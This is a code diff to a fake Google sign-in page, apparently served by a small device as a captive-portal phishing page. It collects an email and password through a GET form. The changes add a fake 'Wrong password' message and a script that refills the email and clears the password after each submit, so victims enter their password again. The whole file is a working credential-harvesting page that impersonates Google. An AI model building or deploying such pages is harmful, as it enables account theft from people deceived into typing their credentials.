@@ -11,13 +11,17 @@ body{font-family:Roboto,Arial,sans-serif;background:#f0f4f9;display:flex;align-i
 .logo{display:flex;align-items:center;gap:10px;margin-bottom:16px}
 .logo svg{width:28px;height:28px}
 .logo span{font-size:22px;color:#1f1f1f}
-h1{font-size:26px;font-weight:400;color:#1f1f1f}
+h1{font-size:26px;font-weight:400;color:#1f1f1f;margin-bottom:22px}
 .sub{font-size:15px;color:#1f1f1f;margin-bottom:26px}
 .field{margin-bottom:18px}
 input{width:100%;font-size:16px;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;outline:none;color:#202124}
 input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
 .btn{width:100%;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px;font-size:15px;font-weight:500;cursor:pointer}
 .hint{font-size:13px;color:#5f6368;margin-top:20px}
+.err{display:none;align-items:flex-start;gap:10px;border:1px solid #d93025;border-radius:4px;padding:12px;margin-bottom:20px}
+.err svg{width:20px;height:20px;flex:none;margin-top:1px}
+.err b{color:#d93025;font-size:14px;font-weight:500;display:block}
+.err p{color:#5f6368;font-size:12px;margin-top:2px}
 </style>
 </head>
 <body>
@@ -27,13 +31,40 @@ input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
     <span>Google</span>
   </div>
   <h1>Sign in</h1>
-  <div class="sub">Use your Google Account</div>
+  <div class="sub" id="sub">Use your Google Account</div>
+
+  <!-- Shown by the script below when the board re-serves this page after a submit.
+       The board keeps the same page, so each portal design renders its OWN "wrong
+       password" state here (no firmware-side page). -->
+  <div class="err" id="err">
+    <svg viewBox="0 0 24 24" fill="#d93025"><path d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-7h-2v5h2V9z"/></svg>
+    <div><b>Wrong password</b><p>Try again or click &ldquo;Forgot password&rdquo; to reset it.</p></div>
+  </div>
+
   <form method="get" action="/">
-    <div class="field"><input type="email" name="email" placeholder="Email or phone" autocomplete="username" required></div>
-    <div class="field"><input type="password" name="password" placeholder="Enter your password" autocomplete="current-password" required></div>
+    <div class="field"><input id="email" type="email" name="email" placeholder="Email or phone" autocomplete="username" required></div>
+    <div class="field"><input id="password" type="password" name="password" placeholder="Enter your password" autocomplete="current-password" required></div>
     <button class="btn" type="submit">Next</button>
   </form>
   <div class="hint">To continue, sign in with your account</div>
 </div>
+<script>
+(function () {
+  // On a fresh load there is no query string -> normal sign-in.
+  // After the form submits (GET /?email=..&password=..) the board re-serves this
+  // exact file, so we detect the params and show the "wrong password" state.
+  var p = new URLSearchParams(location.search);
+  if (!p.has('email') && !p.has('password')) return;
+  var email = document.getElementById('email');
+  if (email) email.value = p.get('email') || '';
+  var pw = document.getElementById('password');
+  if (pw) { pw.value = ''; }
+  var sub = document.getElementById('sub');
+  if (sub) sub.style.display = 'none';
+  var err = document.getElementById('err');
+  if (err) err.style.display = 'flex';
+  if (pw) pw.focus();
+})();
+</script>
 </body>
 </html>
